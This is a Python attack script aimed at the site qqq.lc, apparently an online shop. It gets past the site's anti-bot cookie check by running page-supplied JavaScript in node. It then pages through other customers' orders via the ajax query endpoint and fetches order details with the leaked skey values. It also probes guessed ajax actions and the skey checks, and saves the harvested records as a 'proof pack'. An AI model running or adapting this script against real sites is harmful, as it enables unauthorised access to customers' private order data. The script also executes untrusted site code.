#!/usr/bin/env python3
import re, subprocess, json, time
from pathlib import Path
HOST='qqq.lc'; BASE=f'https://{HOST}'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
OUT=Path('/tmp/qqqlc_out6'); OUT.mkdir(exist_ok=True)

class Jar:
    def __init__(self): self.c={}
    def header(self): return '; '.join(f'{k}={v}' for k,v in self.c.items())
    def absorb(self, hdr_text):
        for line in hdr_text.splitlines():
            if line.lower().startswith('set-cookie:'):
                part=line.split(':',1)[1].strip().split(';')[0]
                if '=' in part:
                    k,v=part.split('=',1); self.c[k.strip()]=v.strip()
jar=Jar()

def curl(path, method='GET', data=None, headers=None, t=40):
    cmd=['curl','-sk','-D','-','--max-time',str(t),'-A',UA,'-H',f'Referer: {BASE}/','--max-redirs','0']
    if jar.c: cmd+=['-H',f'Cookie: {jar.header()}']
    if headers:
        for k,v in headers.items(): cmd+=['-H',f'{k}: {v}']
    url=path if path.startswith('http') else BASE+path
    if method=='POST':
        cmd+=['-X','POST','-H','Content-Type: application/x-www-form-urlencoded','--data-binary',data or '']
    cmd.append(url)
    p=subprocess.run(cmd,capture_output=True,timeout=t+15)
    text=(p.stdout or b'').decode('utf-8','replace')
    hdr,body=(text.split('\r\n\r\n',1)+[''])[:2] if '\r\n\r\n' in text else (text,'')
    jar.absorb(hdr)
    code_m=re.search(r'HTTP/\S+\s+(\d+)',hdr)
    return int(code_m.group(1)) if code_m else 0, body

def pass_cc():
    _,body=curl('/')
    m=re.search(r"setCookie\('ccsafe_defend',(.+?)\);",body)
    val=subprocess.check_output(['node','-e','console.log('+m.group(1)+')'],timeout=20).decode().strip()
    jar.c['ccsafe_defend']=val; jar.c['ccsafe_defend_time']='2'
    curl('/'); curl('/user/login.php')

pass_cc()
xhr={'X-Requested-With':'XMLHttpRequest'}

def query(qq, page=1):
    _,body=curl('/ajax.php?act=query',method='POST',data=f'querytype=1&qq={qq}&page={page}',headers=xhr)
    return json.loads(body)

# scan qq=1 pages 1..30 for any with result or get details sampling every 20th + all status!=1
hits=[]
nonnull=[]
for page in range(1, 31):
    j=query('1', page)
    data=j.get('data') or {}
    if not isinstance(data,dict) or not data:
        print('empty page', page); break
    for i,o in enumerate(data.values()):
        if o.get('result') or o.get('status') not in (0,1):
            hits.append(o)
        # sample detail every 5th on first 3 pages, and all non-1
        if page<=3 and i%5==0 or o.get('status') not in (0,1) or o.get('result'):
            _,body=curl('/ajax.php?act=order',method='POST',data=f'id={o["id"]}&skey={o["skey"]}',headers=xhr)
            try: d=json.loads(body)
            except: continue
            kn={k:d.get(k) for k in ('list','list_result','kminfo','result','status','alert')}
            if any(kn[k] not in (None,'',0,[]) for k in ('list','list_result','kminfo','result')):
                nonnull.append({'id':o['id'], **kn})
                print('NONNULL', o['id'], kn)
            elif page<=2 and i==0:
                print('sample', o['id'], kn)
            time.sleep(0.25)
    print('page', page, 'total', j.get('total'), 'hits_st', len(hits))
    time.sleep(0.35)

print('HIT_ORDERS', len(hits), 'NONNULL', len(nonnull))

# try sms-related acts on a live status=1 order
j=query('1',1)
o=next(iter((j.get('data') or {}).values()))
oid,skey=o['id'],o['skey']
print('LIVE', oid, o.get('status'), o.get('name')[:40])
acts=['refresh','getresult','result','sms','getsms','code','getcode','chongzhi','bu','again','retry','dock','query_result','order_result','getlist','km','kminfo']
for act in acts:
    for data in [f'id={oid}&skey={skey}', f'orderid={oid}&skey={skey}', f'id={oid}']:
        _,body=curl(f'/ajax.php?act={act}',method='POST',data=data,headers=xhr)
        if 'No Act' not in body:
            print(f'ACT {act} [{data[:40]}] {body[:220]}')
            break
    time.sleep(0.2)

# also try GET mod=order
for url in [f'/?mod=order&orderid={oid}&skey={skey}', f'/user/?mod=order&id={oid}&skey={skey}', f'/?mod=query&orderid={oid}']:
    code,body=curl(url)
    print('URL', url, code, len(body), 'chenm', '安全验证' in body, 'kminfo' in body, body[:100].replace('\n',' '))

# path discovery for storefront after login gate - check index with cookies vs without redirect
code,body=curl('/index.php')
print('INDEX', code, len(body), body[:150].replace('\n',' '))

# tools: site=8619 suggests multi-site rainbow - maybe this is master. Try getcount fields.
_,body=curl('/ajax.php?act=getcount',method='POST',data='',headers=xhr)
print('GC', body)

# skey validation: wrong skey
_,body=curl('/ajax.php?act=order',method='POST',data=f'id={oid}&skey=00000000000000000000000000000000',headers=xhr)
print('BAD_SKEY', body[:200])
_,body=curl('/ajax.php?act=order',method='POST',data=f'id={oid}',headers=xhr)
print('NO_SKEY', body[:200])

# export a proof pack: query page1 + one order detail
j=query('1',1)
(OUT/'proof_query_qq1.json').write_text(json.dumps(j, ensure_ascii=False, indent=2)[:100000])
o=next(iter(j['data'].values()))
_,body=curl('/ajax.php?act=order',method='POST',data=f'id={o["id"]}&skey={o["skey"]}',headers=xhr)
(OUT/'proof_order_detail.json').write_text(body)
print('PROOF', o['id'], 'detail_len', len(body))

# gt captcha
_,body=curl('/ajax.php?act=captcha',method='POST',data='',headers=xhr)
print('CAPTCHA', body)

(OUT/'nonnull.json').write_text(json.dumps(nonnull, ensure_ascii=False, indent=2))
print('DONE')
